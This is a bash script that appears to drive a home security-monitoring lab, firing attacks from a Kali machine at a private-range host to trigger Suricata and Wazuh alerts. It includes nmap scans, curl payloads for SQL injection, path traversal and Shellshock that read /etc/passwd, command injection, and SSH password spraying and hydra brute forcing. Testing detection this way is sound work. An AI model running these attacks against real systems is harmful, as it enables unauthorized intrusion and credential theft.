#!/bin/bash

#############################################
# Mini-SOC Attack Simulation Script
# Generates alerts for Suricata (NIDS) and Wazuh (HIDS)
# Execute from Kali Linux VM
#############################################

# Configuration
TARGET_IP="192.168.229.145"
TARGET_NETWORK="192.168.229.0/24"

# Check root privileges
if [ "$EUID" -ne 0 ]; then 
    echo "[ERROR] This script requires root privileges"
    echo "Usage: sudo ./complete-attack-demo.sh"
    exit 1
fi

echo "=========================================="
echo "Mini-SOC Attack Simulation"
echo "=========================================="
echo "Target Host: ${TARGET_IP}"
echo "Target Network: ${TARGET_NETWORK}"
echo ""

# ==========================================
# PART 1: Network Attacks (Suricata NIDS)
# ==========================================
echo "[1/7] Executing Nmap SYN stealth scan (all ports)..."
nmap -sS -p- -T4 $TARGET_IP > /dev/null 2>&1
echo "      Completed"
sleep 5

echo "[2/7] Executing Nmap OS detection and version scan..."
nmap -O -sV -A --script=vuln -T4 $TARGET_IP > /dev/null 2>&1
echo "      Completed"
sleep 5

echo "[3/7] Executing network reconnaissance..."
nmap -sn $TARGET_NETWORK > /dev/null 2>&1
nmap -sU -p 53,161,137 $TARGET_IP > /dev/null 2>&1
echo "      Completed"
sleep 5

echo "[4/7] Executing web application attacks..."
curl -s "http://$TARGET_IP/admin.php?id=1' OR '1'='1" > /dev/null 2>&1
curl -s "http://$TARGET_IP/index.php?page=../../../../../etc/passwd" > /dev/null 2>&1
curl -s "http://$TARGET_IP/cmd.php?exec=whoami;id;uname%20-a" > /dev/null 2>&1
curl -s -A "() { :; }; echo; /bin/bash -c 'cat /etc/passwd'" http://$TARGET_IP > /dev/null 2>&1
curl -s -A "Nikto/2.1.6" http://$TARGET_IP > /dev/null 2>&1
curl -s -A "sqlmap/1.6-dev" http://$TARGET_IP > /dev/null 2>&1
curl -s -A "Metasploit Framework" http://$TARGET_IP > /dev/null 2>&1
echo "      Completed"
sleep 10

# ==========================================
# PART 2: Host Attacks (Wazuh HIDS)
# ==========================================
echo "[5/7] Generating failed SSH authentication attempts..."
for i in {1..10}; do
    sshpass -p "invalid_password_$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@$TARGET_IP exit 2>/dev/null
done
echo "      Completed"
sleep 5

echo "[6/7] Executing SSH brute force attack with rockyou wordlist..."
if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
    head -n 100 /usr/share/wordlists/rockyou.txt > /tmp/wordlist.txt
    hydra -l root -P /tmp/wordlist.txt -t 4 -f ssh://$TARGET_IP > /dev/null 2>&1
    rm -f /tmp/wordlist.txt
else
    echo "      Warning: rockyou.txt not found, using fallback list"
    hydra -l root -P /usr/share/wordlists/rockyou.txt.gz -t 4 ssh://$TARGET_IP > /dev/null 2>&1 || true
fi
echo "      Completed"
sleep 10

echo "[7/7] Attempting privilege escalation patterns..."
for user in root admin administrator; do
    sshpass -p "toor" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@$TARGET_IP exit 2>/dev/null
    sshpass -p "password123" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 $user@$TARGET_IP exit 2>/dev/null
done
echo "      Completed"
sleep 5

# Summary
echo ""
echo "=========================================="
echo "Attack Simulation Complete"
echo "=========================================="
echo ""
echo "Network Attacks Generated:"
echo "  - Nmap SYN stealth scan (all 65535 ports)"
echo "  - OS detection with vulnerability scanning"
echo "  - Network reconnaissance and UDP probing"
echo "  - SQL injection attempts"
echo "  - Directory traversal attacks"
echo "  - Command injection attempts"
echo "  - Shellshock exploitation attempts"
echo ""
echo "Host Attacks Generated:"
echo "  - Failed SSH authentication (10 attempts)"
echo "  - SSH brute force (rockyou.txt wordlist)"
echo "  - Multi-user privilege escalation attempts"
echo ""
echo "Dashboard: http://192.168.229.143:5601"
echo "Wait 30 seconds then refresh Kibana dashboard"
echo ""
